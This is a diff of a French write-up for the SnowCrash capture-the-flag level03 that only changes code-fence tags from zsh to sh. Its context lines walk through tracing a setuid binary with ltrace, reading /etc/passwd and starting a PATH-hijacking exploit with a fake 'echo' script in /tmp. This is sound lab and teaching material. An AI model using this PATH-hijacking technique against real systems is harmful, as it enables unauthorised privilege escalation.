@@ -4,7 +4,7 @@
 
 ## Rechercher et exécuter le fichier
 
-```zsh
+```sh
 level03@SnowCrash:~$ ls -al
 total 24
 dr-x------ 1 level03 level03  120 Mar  5  2016 .
@@ -29,7 +29,7 @@ ltrace est l'une des commandes disponibles sous Linux. C'est un programme, pas u
 
 ltrace est un outil qui trace et affiche le comportement des fonctions de la bibliothèque appelées par un fichier exécutable. Par conséquent, il peut être utilisé pour le débogage ou l'analyse en traçant les appels de fonction, les paramètres et les valeurs de retour dans un fichier exécutable.
 
-```zsh
+```sh
 level03@SnowCrash:~$ ltrace ./level03
 __libc_start_main(0x80484a4, 1, 0xbffff7b4, 0x8048510, 0x8048580 <unfinished ...>
 getegid()                                                                                            = 2003
@@ -43,14 +43,14 @@ system("/usr/bin/env echo Exploit me"Exploit me
 +++ exited (status 0) +++
 ```
 
-```zsh
+```sh
 setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                                        = 0
 setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                                        = 0
 ```
 
 c'est quoi 0 pour user id?
 
-```zsh
+```sh
 level03@SnowCrash:~$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash // here!!!!!!!!!!
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
@@ -74,7 +74,7 @@ En d'autres termes, mettez getflag dans echo et exécutez-le.
 
 ## getflag
 
-```zsh
+```sh
 level03@SnowCrash:~$ whereis getflag
 getflag: /bin/getflag
 ```
@@ -83,7 +83,7 @@ getflag: /bin/getflag
 
 ## Créez un fichier écho et placez le chemin devant PATH
 
-```zsh
+```sh
 level03@SnowCrash:~$ mkdir /tmp/level03
 level03@SnowCrash:~$ vim /tmp/level03/echo
 #!/bin/bash
